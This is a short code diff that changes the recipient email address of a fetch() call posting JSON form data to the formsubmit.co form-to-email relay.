@@ -534,7 +534,7 @@
         _template: 'table'
       };
 
-      fetch('https://formsubmit.co/ajax/epicnoob22@proton.me', {
+      fetch('https://formsubmit.co/ajax/rayan.riri78@gmail.com', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify(formData)
